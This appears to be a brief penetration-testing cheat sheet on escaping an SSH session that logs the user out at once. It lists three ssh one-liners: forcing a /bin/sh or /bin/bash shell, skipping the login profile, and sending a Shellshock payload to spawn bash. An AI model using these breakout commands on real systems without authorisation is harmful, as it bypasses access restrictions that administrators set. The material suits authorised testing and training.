# Immediately logout after SSH
If you immediately get logged out after you SSH, try any of the following commands to escape:
```
ssh -i <sshKey> <username>@<targetIP> -t "/bin/sh" "/bin/bash"

# OR
ssh -i <sshKey> <username>@<targetIP> -t "bash -- noprofile"


# OR (shellshock)
ssh -i <sshKey> <username>@<targetIP> -t "() { :; }; /bin/bash" 
```